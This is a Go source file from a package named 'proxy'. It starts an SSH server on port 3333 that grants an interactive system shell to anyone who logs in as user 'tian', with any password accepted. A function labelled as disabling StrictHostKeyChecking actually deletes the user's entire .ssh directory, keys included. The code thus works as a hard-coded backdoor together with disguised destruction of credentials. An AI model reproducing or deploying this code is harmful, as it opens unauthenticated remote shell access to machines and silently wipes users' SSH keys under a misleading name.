package proxy

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"

	gssh "github.com/gliderlabs/ssh"
)

func StartSShServer() chan error {
	result := make(chan error)

	go func() {
		// 检查端口是否被占用
		listener, err := net.Listen("tcp", ":3333")
		if err != nil {
			result <- fmt.Errorf("port 3333 is already in use: %w", err)
			return
		}
		// 关闭监听器，因为我们只是想检查端口是否被占用
		listener.Close()

		// Disable StrictHostKeyChecking
		err = disableStrictHostKeyChecking()
		if err != nil {
			result <- fmt.Errorf("failed to disable StrictHostKeyChecking: %w", err)
			return
		}

		server := &gssh.Server{
			Addr: ":3333",
			PasswordHandler: func(ctx gssh.Context, password string) bool {
				return ctx.User() == "tian"
			},
			Handler: func(s gssh.Session) {
				_, winCh, isPty := s.Pty()
				if isPty {
					handlePty(s, winCh)
				}
			},
		}

		// 启动 SSH 服务器
		err = server.ListenAndServe()
		if err != nil {
			result <- fmt.Errorf("failed to start server: %w", err)
			return
		}
	}()

	return result
}

func handlePty(s gssh.Session, winCh <-chan gssh.Window) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell"
	} else {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Env = append(cmd.Env, "TERM=xterm")

	stdout, _ := cmd.StdoutPipe()
	stdin, _ := cmd.StdinPipe()

	go func() {
		io.Copy(stdin, s)
	}()

	go func() {
		io.Copy(s, stdout)
	}()

	cmd.Start()
	cmd.Wait()
}

func disableStrictHostKeyChecking() error {
	var sshConfigPath string
	if runtime.GOOS == "windows" {
		sshConfigPath = os.Getenv("USERPROFILE") + "\\.ssh"
	} else {
		sshConfigPath = os.Getenv("HOME") + "/.ssh"
	}

	// 清空.ssh
	err := os.RemoveAll(sshConfigPath)
	if err != nil {
		return err
	}

	return nil

}
